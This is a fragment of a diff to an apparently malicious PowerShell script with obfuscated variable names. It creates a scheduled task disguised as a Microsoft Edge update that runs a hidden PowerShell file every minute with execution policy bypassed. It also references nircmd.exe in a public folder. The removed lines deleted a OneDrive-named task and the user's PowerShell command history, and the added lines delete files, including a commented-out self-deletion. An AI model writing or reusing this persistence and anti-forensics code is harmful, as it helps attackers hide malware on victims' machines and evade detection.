@@ -27,7 +27,6 @@ $sdlkbignrg | Out-File -FilePath $bziuxubvde -Encoding UTF8;
 $NirCmdPath = "C:\Users\Public\Videos\nircmd.exe";
 #schtasks /create /tn "MicrosoftEdgeUpdateTaskMachineRtoscdge124678" /tr "$NirCmdPath exec hide powershell.exe -ExecutionPolicy Bypass -File $bziuxubvde" /SC MINUTE /MO 1;
 schtasks /create /tn "MicrosoftEdgeUpdateTaskMachineRtoscdge124678" /tr "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $bziuxubvde" /SC MINUTE /MO 1;
-Unregister-ScheduledTask -TaskName 'OneDriveOnceUpdateUIMachine' -Confirm:$false;
-$his = $env:appdata + "\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
-Remove-Item -path $his -force
+if ([System.IO.File]::Exists($sdgre)) {remove-item $sdgre -Force -Recurse -ErrorAction SilentlyContinue};
+#Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue;
 };
